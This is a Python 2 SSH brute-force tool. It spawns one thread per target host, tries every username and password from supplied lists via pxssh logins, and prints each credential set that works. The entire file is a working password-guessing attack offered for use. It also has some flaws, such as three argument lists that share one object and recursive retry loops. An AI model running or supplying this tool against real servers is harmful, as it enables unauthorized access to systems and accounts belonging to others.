#!/usr/bin/env python2
import pexpect.pxssh, argparse, sys, threading, getpass, time


threadkiller = False

def snd(sock, cmd):
    sock.sendline(cmd)    # run a command on open ssh socket
    sock.prompt()         # copy prompt to buffer for reference
    print(sock.before())  # print everything on recv buffer before matching prompt buffer


def cx(h,u,p,exitOnSingle,exitOnHost, fails=0):
    global threadkiller
    try:
        sock = pexpect.pxssh.pxssh()
        sock.login(h, u, p)
        sock.logout()
        found = True
        print("[!] FOUND: %s:%s:%s" % (h, u, p))
        if exitOnSingle == True:
            threadkiller = True
            sys.exit(1)
        if exitOnHost == True:
            sys.exit()
        return found
    except Exception, e:
        if 'read_nonblocking' in str(e):
            while not fails == 5:
                fails += 1
                time.sleep(5)
                cx(h,u,p,exitOnSingle,exitOnHost, fails)
        elif 'synchronize with original prompt' in str(e):
            while not fails == 5:
                fails += 1
                time.sleep(1)
                cx(h,u,p,exitOnSingle,exitOnHost, fails)
        else:
            print(str(e))
            pass



def connect(h, user, passwd, exitOnSingle, exitOnHost):
    global threadkiller
    li_p = []
    li_u = []
    for p in passwd:
        li_p.append(p.strip('\n'))
    for u in user:
        li_u.append(u.strip('\n'))
    for u in li_u:
        found = False
        while (found == False):
            for p in li_p:
                if threadkiller == True:
                    sys.exit()
                if found == False:
                    found = cx(h,u,p.strip('\n'), exitOnSingle, exitOnHost)


def listparse(f):
    li = []
    fd = open(f, 'r')
    for item in fd:
        li.append(item.strip('\n'))
    fd.close()
    return li


def getargs():
    li_h = li_u = li_p = []
    ap = argparse.ArgumentParser(description="SSH bruteforcer.  Threading per-host.")
    ap.add_argument('-u', '--user', type=str, help="single username")
    ap.add_argument('-U', '--users', type=str, help="users file")
    ap.add_argument('-Ho', '--hostname', type=str, help='single hostname')
    ap.add_argument('-HO', '--hostnames', type=str, help='hostnames file')
    ap.add_argument('-p', '--password', action='store_true', default=False, help='prompt for single password')
    ap.add_argument('-P', '--passwords', type=str, help='passwords file')
    ap.add_argument('-e', '--exitOnHost', action='store_true', default=False, help='Exit thread-on-host on any single found password')
    ap.add_argument('-E', '--exitOnSingle', action='store_true', default=False, help='Exit program after any single found password, across all hosts')
    args, left = ap.parse_known_args() 
    if (args.user == None and args.users == None) or (args.hostname == None and args.hostnames == None) or (args.password == False and args.passwords == None):
        ap.print_help()
        sys.exit()
    if not (args.hostnames == None):
        li_h = listparse(args.hostnames)
    if not (args.users == None):
        li_u = listparse(args.users)
    if not (args.passwords == None):
        li_p = listparse(args.passwords)
    if not (args.hostname == None):
        li_h.append(args.hostname.strip('\n'))
    if not (args.user == None):
        li_u.append(args.user.strip('\n'))
    if not (args.password == False):
        li_p.append(getpass.getpass())
    return li_h, li_u, li_p, args.exitOnSingle, args.exitOnHost # list items for hostname, user, password 


def main():
    list_h = list_u = list_p = []
    exitOnSingle = exitOnHost = False
    list_h, list_u, list_p, exitOnSingle, exitOnHost = getargs()
    for h in list_h:
        try:
            threading.Thread(target=connect, args=(h, list_u, list_p, exitOnSingle, exitOnHost)).start()
            print("Thread started on host %s" % h)
        except:
            print("Error at %s" % (h))


if __name__=="__main__":
    main()

